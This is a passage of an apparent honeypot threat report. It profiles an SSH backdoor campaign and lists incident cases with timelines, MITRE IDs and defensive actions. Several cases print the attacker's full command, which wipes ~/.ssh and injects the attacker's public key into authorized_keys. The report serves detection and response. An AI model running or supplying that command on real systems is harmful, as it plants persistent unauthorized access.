/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.14`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `45.169.200.254`, `156.239.224.104`, `102.210.149.105`, `177.53.215.134`, `43.157.248.241`, `219.152.229.165`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **133** |
| Unique ASNs | **89** |
| High-Risk ASNs | **73** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 7 | MEDIUM |
| `AS22773` | Cox Communications Inc. | 6 | MEDIUM |
| `AS398324` | Censys, Inc. | 5 | HIGH |
| `AS48721` | Flyservers S.A. | 4 | HIGH |
| `AS396982` | Google LLC | 4 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (328)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-104416cd8c33

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]105` |
| **First Seen** | 2026-07-30 12:56 |
| **Last Seen** | 2026-07-30 12:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 12:56:52` | `cowrie.session.connect` |
| `2026-07-30 12:56:52` | `cowrie.client.version` |
| `2026-07-30 12:56:53` | `cowrie.client.kex` |
| `2026-07-30 12:56:54` | `cowrie.login.success` |
| `2026-07-30 12:56:55` | `cowrie.session.params` |
| `2026-07-30 12:56:55` | `cowrie.command.input` |
| `2026-07-30 12:56:55` | `cowrie.command.failed` |
| `2026-07-30 12:56:56` | `cowrie.log.closed` |
| `2026-07-30 12:56:57` | `cowrie.session.params` |
| `2026-07-30 12:56:57` | `cowrie.command.input` |
| `2026-07-30 12:56:57` | `cowrie.session.file_download` |
| `2026-07-30 12:56:57` | `cowrie.log.closed` |
| `2026-07-30 12:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]105` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-293c5050a9ba

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]105` |
| **First Seen** | 2026-07-30 12:56 |
| **Last Seen** | 2026-07-30 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 12:56:57` | `cowrie.session.connect` |
| `2026-07-30 12:56:57` | `cowrie.client.version` |
| `2026-07-30 12:56:58` | `cowrie.client.kex` |
| `2026-07-30 12:56:59` | `cowrie.login.success` |
| `2026-07-30 12:56:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]105` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61842a7055f8

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]105` |
| **First Seen** | 2026-07-30 12:57 |
| **Last Seen** | 2026-07-30 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 12:57:00` | `cowrie.session.connect` |
| `2026-07-30 12:57:00` | `cowrie.client.version` |
| `2026-07-30 12:57:00` | `cowrie.client.kex` |
| `2026-07-30 12:57:01` | `cowrie.login.success` |
| `2026-07-30 12:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]105` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3061e49cb8c3

| Field | Detail |
|---|---|
| **Source IP** | `103.84.236[.]242` |
| **First Seen** | 2026-07-30 12:59 |
| **Last Seen** | 2026-07-30 13:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 12:59:55` | `cowrie.session.connect` |
| `2026-07-30 12:59:55` | `cowrie.client.version` |
| `2026-07-30 12:59:55` | `cowrie.client.kex` |
| `2026-07-30 12:59:56` | `cowrie.login.success` |
| `2026-07-30 12:59:57` | `cowrie.session.params` |
| `2026-07-30 12:59:57` | `cowrie.command.input` |
| `2026-07-30 12:59:57` | `cowrie.command.failed` |
| `2026-07-30 12:59:58` | `cowrie.log.closed` |
| `2026-07-30 12:59:59` | `cowrie.session.params` |
| `2026-07-30 12:59:59` | `cowrie.command.input` |
| `2026-07-30 12:59:59` | `cowrie.session.file_download` |
| `2026-07-30 12:59:59` | `cowrie.log.closed` |
| `2026-07-30 13:00:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.84.236[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.84.236[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a630db852c7f

| Field | Detail |
|---|---|
| **Source IP** | `103.84.236[.]242` |
| **First Seen** | 2026-07-30 12:59 |
| **Last Seen** | 2026-07-30 13:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 12:59:59` | `cowrie.session.connect` |
| `2026-07-30 12:59:59` | `cowrie.client.version` |
| `2026-07-30 12:59:59` | `cowrie.client.kex` |
| `2026-07-30 13:00:01` | `cowrie.login.success` |
| `2026-07-30 13:00:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.84.236[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.84.236[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2caa03a6bb9

| Field | Detail |
|---|---|
| **Source IP** | `103.84.236[.]242` |
| **First Seen** | 2026-07-30 13:00 |
| **Last Seen** | 2026-07-30 13:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:00:01` | `cowrie.session.connect` |
| `2026-07-30 13:00:01` | `cowrie.client.version` |
| `2026-07-30 13:00:01` | `cowrie.client.kex` |
| `2026-07-30 13:00:03` | `cowrie.login.success` |
| `2026-07-30 13:00:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.84.236[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.84.236[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c67b71cf0dd

| Field | Detail |
|---|---|
| **Source IP** | `95.35.29[.]192` |
| **First Seen** | 2026-07-30 13:09 |
| **Last Seen** | 2026-07-30 13:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:09:13` | `cowrie.session.connect` |
| `2026-07-30 13:09:14` | `cowrie.client.version` |
| `2026-07-30 13:09:14` | `cowrie.client.kex` |
| `2026-07-30 13:09:15` | `cowrie.login.success` |
| `2026-07-30 13:09:16` | `cowrie.direct-tcpip.request` |
| `2026-07-30 13:09:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.35.29[.]192` to AbuseIPDB if not already reported
- [ ] Block `95.35.29[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a66271c5248d

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-07-30 13:09 |
| **Last Seen** | 2026-07-30 13:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:09:21` | `cowrie.session.connect` |
| `2026-07-30 13:09:22` | `cowrie.client.version` |
| `2026-07-30 13:09:22` | `cowrie.client.kex` |
| `2026-07-30 13:09:24` | `cowrie.login.success` |
| `2026-07-30 13:09:24` | `cowrie.direct-tcpip.request` |
| `2026-07-30 13:09:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bb331b1164a

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-07-30 13:11 |
| **Last Seen** | 2026-07-30 13:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:11:30` | `cowrie.session.connect` |
| `2026-07-30 13:11:30` | `cowrie.client.version` |
| `2026-07-30 13:11:30` | `cowrie.client.kex` |
| `2026-07-30 13:11:32` | `cowrie.login.success` |
| `2026-07-30 13:11:33` | `cowrie.direct-tcpip.request` |
| `2026-07-30 13:11:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-992018283df9

| Field | Detail |
|---|---|
| **Source IP** | `182.76.36[.]62` |
| **First Seen** | 2026-07-30 13:11 |
| **Last Seen** | 2026-07-30 13:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:11:39` | `cowrie.session.connect` |
| `2026-07-30 13:11:39` | `cowrie.client.version` |
| `2026-07-30 13:11:39` | `cowrie.client.kex` |
| `2026-07-30 13:11:42` | `cowrie.login.success` |
| `2026-07-30 13:11:42` | `cowrie.direct-tcpip.request` |
| `2026-07-30 13:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.76.36[.]62` to AbuseIPDB if not already reported
- [ ] Block `182.76.36[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-501d1772a0a1

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-07-30 13:15 |
| **Last Seen** | 2026-07-30 13:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:15:00` | `cowrie.session.connect` |
| `2026-07-30 13:15:01` | `cowrie.client.version` |
| `2026-07-30 13:15:01` | `cowrie.client.kex` |
| `2026-07-30 13:15:02` | `cowrie.login.success` |
| `2026-07-30 13:15:02` | `cowrie.direct-tcpip.request` |
| `2026-07-30 13:15:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac2e10a713aa

| Field | Detail |
|---|---|
| **Source IP** | `221.199.172[.]66` |
| **First Seen** | 2026-07-30 13:21 |
| **Last Seen** | 2026-07-30 13:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:21:52` | `cowrie.session.connect` |
| `2026-07-30 13:21:53` | `cowrie.client.version` |
| `2026-07-30 13:21:53` | `cowrie.client.kex` |
| `2026-07-30 13:21:56` | `cowrie.login.success` |
| `2026-07-30 13:21:57` | `cowrie.direct-tcpip.request` |
| `2026-07-30 13:22:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.199.172[.]66` to AbuseIPDB if not already reported
- [ ] Block `221.199.172[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e92e2573703

| Field | Detail |
|---|---|
| **Source IP** | `123.123.196[.]140` |
| **First Seen** | 2026-07-30 13:22 |
| **Last Seen** | 2026-07-30 13:22 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:22:02` | `cowrie.session.connect` |
| `2026-07-30 13:22:03` | `cowrie.client.version` |
| `2026-07-30 13:22:03` | `cowrie.client.kex` |
| `2026-07-30 13:22:06` | `cowrie.login.success` |
| `2026-07-30 13:22:07` | `cowrie.direct-tcpip.request` |
| `2026-07-30 13:22:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.123.196[.]140` to AbuseIPDB if not already reported
- [ ] Block `123.123.196[.]140` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bddb0036ec23

| Field | Detail |
|---|---|
| **Source IP** | `85.19.195[.]12` |
| **First Seen** | 2026-07-30 13:30 |
| **Last Seen** | 2026-07-30 13:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:30:10` | `cowrie.session.connect` |
| `2026-07-30 13:30:10` | `cowrie.client.version` |
| `2026-07-30 13:30:10` | `cowrie.client.kex` |
| `2026-07-30 13:30:11` | `cowrie.login.success` |
| `2026-07-30 13:30:11` | `cowrie.direct-tcpip.request` |
| `2026-07-30 13:30:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.19.195[.]12` to AbuseIPDB if not already reported
- [ ] Block `85.19.195[.]12` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21304de1003e

| Field | Detail |
|---|---|
| **Source IP** | `27.107.102[.]154` |
| **First Seen** | 2026-07-30 13:30 |
| **Last Seen** | 2026-07-30 13:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:30:21` | `cowrie.session.connect` |
| `2026-07-30 13:30:21` | `cowrie.client.version` |
| `2026-07-30 13:30:21` | `cowrie.client.kex` |
| `2026-07-30 13:30:23` | `cowrie.login.success` |
| `2026-07-30 13:30:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.107.102[.]154` to AbuseIPDB if not already reported
- [ ] Block `27.107.102[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3c662e492e7

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-30 13:35 |
| **Last Seen** | 2026-07-30 13:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:35:59` | `cowrie.session.connect` |
| `2026-07-30 13:35:59` | `cowrie.client.version` |
| `2026-07-30 13:35:59` | `cowrie.client.kex` |
| `2026-07-30 13:36:00` | `cowrie.login.success` |
| `2026-07-30 13:36:00` | `cowrie.direct-tcpip.request` |
| `2026-07-30 13:36:00` | `cowrie.direct-tcpip.data` |
| `2026-07-30 13:36:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8366159ad02b

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-30 13:37 |
| **Last Seen** | 2026-07-30 13:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:37:34` | `cowrie.session.connect` |
| `2026-07-30 13:37:34` | `cowrie.client.version` |
| `2026-07-30 13:37:34` | `cowrie.client.kex` |
| `2026-07-30 13:37:35` | `cowrie.login.success` |
| `2026-07-30 13:37:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b659978b5970

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-30 13:37 |
| **Last Seen** | 2026-07-30 13:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:37:34` | `cowrie.session.connect` |
| `2026-07-30 13:37:34` | `cowrie.client.version` |
| `2026-07-30 13:37:34` | `cowrie.client.kex` |
| `2026-07-30 13:37:35` | `cowrie.login.success` |
| `2026-07-30 13:37:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f32e5e246535

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-30 13:37 |
| **Last Seen** | 2026-07-30 13:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:37:36` | `cowrie.session.connect` |
| `2026-07-30 13:37:36` | `cowrie.client.version` |
| `2026-07-30 13:37:36` | `cowrie.client.kex` |
| `2026-07-30 13:37:36` | `cowrie.login.success` |
| `2026-07-30 13:37:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f11e4172d6e7

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-30 13:37 |
| **Last Seen** | 2026-07-30 13:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:37:37` | `cowrie.session.connect` |
| `2026-07-30 13:37:37` | `cowrie.client.version` |
| `2026-07-30 13:37:37` | `cowrie.client.kex` |
| `2026-07-30 13:37:37` | `cowrie.login.success` |
| `2026-07-30 13:37:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b51710f4d035

| Field | Detail |
|---|---|
| **Source IP** | `14.29.242[.]244` |
| **First Seen** | 2026-07-30 13:38 |
| **Last Seen** | 2026-07-30 13:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:38:11` | `cowrie.session.connect` |
| `2026-07-30 13:38:11` | `cowrie.client.version` |
| `2026-07-30 13:38:12` | `cowrie.client.kex` |
| `2026-07-30 13:38:12` | `cowrie.login.success` |
| `2026-07-30 13:38:14` | `cowrie.session.params` |
| `2026-07-30 13:38:14` | `cowrie.command.input` |
| `2026-07-30 13:38:14` | `cowrie.log.closed` |
| `2026-07-30 13:38:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.242[.]244` to AbuseIPDB if not already reported
- [ ] Block `14.29.242[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c158cbf0cac

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]185` |
| **First Seen** | 2026-07-30 13:47 |
| **Last Seen** | 2026-07-30 13:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:47:16` | `cowrie.session.connect` |
| `2026-07-30 13:47:17` | `cowrie.client.version` |
| `2026-07-30 13:47:17` | `cowrie.client.kex` |
| `2026-07-30 13:47:19` | `cowrie.login.success` |
| `2026-07-30 13:47:19` | `cowrie.direct-tcpip.request` |
| `2026-07-30 13:47:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]185` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]185` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-088735b76194

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]53` |
| **First Seen** | 2026-07-30 13:47 |
| **Last Seen** | 2026-07-30 13:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:47:25` | `cowrie.session.connect` |
| `2026-07-30 13:47:25` | `cowrie.client.version` |
| `2026-07-30 13:47:25` | `cowrie.client.kex` |
| `2026-07-30 13:47:26` | `cowrie.login.success` |
| `2026-07-30 13:47:27` | `cowrie.direct-tcpip.request` |
| `2026-07-30 13:47:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]53` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2967bd485301

| Field | Detail |
|---|---|
| **Source IP** | `101.13.4[.]124` |
| **First Seen** | 2026-07-30 13:50 |
| **Last Seen** | 2026-07-30 13:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
